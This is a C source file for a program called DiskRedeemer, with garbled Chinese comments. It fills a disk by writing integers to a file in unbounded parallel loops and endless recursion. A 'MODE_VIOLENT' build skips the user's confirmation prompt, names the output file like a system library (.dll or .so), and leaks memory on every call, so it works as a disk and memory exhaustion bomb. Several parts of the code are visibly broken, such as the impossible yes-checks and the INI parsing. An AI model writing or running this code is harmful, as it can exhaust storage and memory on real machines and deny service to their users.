//DiskRedeemer_OpenMP
#include"OS.h"
#include"Language.h"
#include"ScenariosControl.h"
#include"ComplierControl.h"

#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<limits.h>

#ifdef OpenMP_AVAILABLE
    #include<omp.h>
#endif // OpenMP_AVAILABLE

#ifdef SYSTEM_WINDOWS
	#include<Windows.h>
	#include<windowsx.h>
#endif // SYSTEM_WINDOWS

#define MAXLEN 50
#define MAX_KEYNUM 5

int i = 0;
//int j = 0;

int MultiFork(void)
{
    #pragma omp parallel
	{
		#ifdef MODE_VIOLENT
			#ifdef SYSTEM_WINDOWS
					FILE *FILES = fopen("FILES.dll", "a");
			#endif // SYSTEM_WINDOWS

			#ifdef SYSTEM_LINUX
					FILE *FILES = fopen("FILES.so", "a");
			#endif // SYSTEM_LINUX

			#ifndef SYSTEM_WINDOWS
				#ifndef SYSTEM_LINUX
						FILE *FILES = fopen("FILES.txt", "a");
				#endif
			#endif
					// SYSTEM_OTHERS
		#endif // MODE_VIOLENT
		//��һ����Ϊ��������ͬ��д�������ģ��,������MODE_VIOLENT������

		#ifndef MODE_VIOLENT
			FILE *ini = fopen("DiskRedeemer.ini", "r");
			//��ȡINI�ļ����ҿ��ǽڵ�������һ���ѵ�
			//if (ini == NULL)
			//	char FILE_NAME[] = "DiskRedeemer";
			//else
				char FILE_NAME[MAXLEN] = { 0 };

			char INI_Node[MAXLEN] = { 0 };
			fscanf(ini, "%s", INI_Node);
			#ifdef DEBUG
				printf("%s\n", INI_Node);
			#endif // DEBUG
			char INI_KEY_VALUE[MAX_KEYNUM][2][MAXLEN];
			i = 0;
			while (fscanf(ini, "%s=%s", INI_KEY_VALUE[i][0], INI_KEY_VALUE[i][1]) != EOF)
			{
				i++;
			}
			#ifdef DEBUG
				for (i = 0; i < MAX_KEYNUM; ++i)
				{
					printf("%=%s\n", INI_KEY_VALUE[i][0], INI_KEY_VALUE[i][1]);
				}
			#endif // DEBUG
			//�����Ͷ���ô���У���������ʱ����
			//���ȡ����INI�ļ����Ʋ�https://blog.csdn.net/qq_39141723/article/details/98732488
			strcpy(FILE_NAME, INI_KEY_VALUE[1][1]);
			FILE *FILES = fopen(FILE_NAME, "a");
		#endif // !MODE_VIOLENT
		//��һ����Ϊ�˹���һ���Ƕ���ģʽ�µĿɱ��ļ���ϵͳ

		//δ��������ῼ�����ƴ��ι��ܣ�������defineΪ�������ȵ�ʱ�����Ȳ��ô��ε��������ݣ�����������Ŀ������Ŀ��Ϊ��
#ifdef DEBUG
			printf("�ļ���Ϊ%s",FILE_NAME);
#endif // DEBUG

        #pragma omp parallel for
		for (i = 0; i < INT_MAX; ++i)
		{
			fprintf(FILES, "%d", INT_MAX);
		}
		fclose(FILES);
	}
	#ifdef MODE_VIOLENT
		int *p = (int*)malloc(sizeof(int));
	#endif // Malloc Memory at the same time
	return MultiFork();
}

int main_Redeemer(int argc,char *argv[])
{
	#ifdef DEBUG
		int i_PrintArgument = 0;
		for (i_PrintArgument = 0; i_PrintArgument < argc; ++i_PrintArgument)
		{
			printf("%s\n", argv[i_PrintArgument]);
		}
	#endif // DEBUG

	//int i = 0;
	//int flag_NologoExist =0;
	//const char nologoStr[] = { "-nologo" };
	//for (i = 0; i < argc; ++i)
	//{
	//	if (strcmp(&nologoStr, argv[i]) == 0)
	//		flag_NologoExist = 1;
	//}
	//if (flag_NologoExist != 1)
	//	printf("LOGO\n");

	//��ʵ������γ���дը�ˣ������������LOGO������ʾ������������

	printf("__        __   _                           !\n");
	printf("\ \      / /__| | ___ ___  _ __ ___   ___  !\n");
	printf(" \ \ /\ / / _ \ |/  __/ _ | '_ ` _ \ / _ \ !\n");
	printf("  \ V  V /  __/ | (_| (_) | | | | | |  __/ !\n");
	printf("   \_/\_/ \___|_|\___\___/|_| |_| |_|\___| !\n");
	//ASCII Art��Դ��https://github.com/keonjeo/ascii_art_demo

	#ifdef SYSTEM_WINDOWS
        #ifndef MODE_VIOLENT
			#ifdef zh_CN
					MessageBox(NULL, TEXT("����ʼ�Ե�ǰ���̽���д��\n����ȷ�ϣ�"), TEXT("Warning"), MB_OKCANCEL | MB_ICONWARNING);
			#endif // zh_CN

			#ifdef en_US
					MessageBox(NULL, TEXT("Writing to the current disk will begin\nPlease confirm!"), TEXT("Warning"), MB_OKCANCEL | MB_ICONWARNING);
			#endif // en_US
        #endif
	#endif // SYSTEM_WINDOWS

	#ifndef SYSTEM_WINDOWS
		#ifndef MODE_VIOLENT
            #ifdef zh_CN
				printf("����ʼ�Ե�ǰ���̽���д��\n��������Yȷ�ϣ�����������������ȡ����");
			#endif // zh_CN

			#ifdef en_US
				printf("Writing to the current disk will begin!\nPlease enter Y to confirm, enter any other content to cancel!");
			#endif // en_US

				//��Զ��Ҫ�����û�������
				char Judge[MAXLEN];
				scanf_s("%s", Judge, 50 - 1);
				if (Judge[0] == 'Y' || Judge[0] == 'y' || (Judge[0] == 'y'&&Judge[0] == 'e'&&Judge[0] == 's') || (Judge[0] == 'Y'&&Judge[0] == 'e'&&Judge[0] == 's') || (Judge[0] == 'Y'&&Judge[0] == 'E'&&Judge[0] == 'S'))
					;
				else
					return 0;
		#endif
	#endif // SYSTEM_WINDOWS

    #pragma omp parallel
	{
		while (1)
		{
			MultiFork();
		}
	}
	return 0;
}